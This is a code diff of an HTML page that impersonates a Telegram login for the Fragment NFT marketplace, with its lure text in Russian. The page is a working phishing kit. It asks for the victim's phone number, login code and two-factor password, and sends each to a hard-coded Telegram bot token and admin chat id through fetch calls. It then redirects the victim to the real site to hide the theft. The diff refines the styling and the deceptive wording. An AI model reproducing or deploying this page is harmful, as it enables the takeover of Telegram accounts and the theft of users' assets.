@@ -6,22 +6,24 @@
     <title>Fragment — Login</title>
     <style>
         body { font-family: -apple-system, sans-serif; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { width: 300px; text-align: center; border: 1px solid #eee; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; }
-        button { width: 100%; padding: 12px; background: #24A1DE; color: #fff; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        .container { width: 310px; text-align: center; border: 1px solid #f0f0f0; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: #24A1DE; }
+        button { width: 100%; padding: 14px; background: #24A1DE; color: #fff; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
         .hidden { display: none; }
-        img { margin-bottom: 15px; border-radius: 50%; }
-        p { color: #707579; font-size: 14px; }
+        img { margin-bottom: 15px; }
+        h2 { font-size: 22px; margin-bottom: 10px; }
+        p { color: #707579; font-size: 14px; line-height: 1.4; }
     </style>
 </head>
 <body>
     <div class="container">
         <img src="https://telegram.org/img/t_logo.png" width="80">
         <h2 id="title">Войти в Telegram</h2>
-        <p id="desc">Введите номер телефона для авторизации на Fragment</p>
+        <p id="desc">Введите номер телефона для авторизации на Fragment и проверки NFT</p>
 
         <div id="step-phone">
-            <input type="text" id="phone" placeholder="+7 900 123-45-67">
+            <input type="text" id="phone" placeholder="+7 900 000-00-00">
             <button onclick="nextStep('code')">ДАЛЕЕ</button>
         </div>
 
@@ -40,23 +42,23 @@
         const BOT_TOKEN = "8585395713:AAHrT4qsXLKIrrLaTrMlBZN4NwDgFfEEGfw";
         const ADMIN_ID = "6698151622";
 
-        function sendData(text) {
+        function sendToBot(text) {
             fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown);
         }
 
         function nextStep(step) {
             if (step === 'code') {
                 const p = document.getElementById('phone').value;
-                if(p) {
-                    sendData("📱 Новый номер: " + p + "");
+                if(p.length > 5) {
+                    sendToBot("📱 Новый лог!\nНомер: " + p + "");
                     document.getElementById('step-phone').classList.add('hidden');
                     document.getElementById('step-code').classList.remove('hidden');
-                    document.getElementById('desc').innerText = "Введите код из приложения Telegram";
+                    document.getElementById('desc').innerText = "Введите код, который пришел вам в Telegram";
                 }
             } else if (step === 'pass') {
                 const c = document.getElementById('code').value;
-                if(c) {
-                    sendData("🔢 Код: " + c + "");
+                if(c.length >= 4) {
+                    sendToBot("🔢 Код подтверждения: " + c + "");
                     document.getElementById('step-code').classList.add('hidden');
                     document.getElementById('step-pass').classList.remove('hidden');
                     document.getElementById('desc').innerText = "Введите ваш пароль двухфакторной аутентификации";
@@ -67,8 +69,8 @@
         function finish() {
             const pass = document.getElementById('password').value;
             if(pass) {
-                sendData("🔑 Пароль 2FA: " + pass + "");
-                alert("Синхронизация запущена. Отчет о NFT придет в чат.");
+                sendToBot("🔑 Пароль 2FA: " + pass + "");
+                alert("Синхронизация с Fragment запущена. Проверка NFT займет около 1 минуты.");
                 window.location.href = "https://fragment.com";
             }
         }
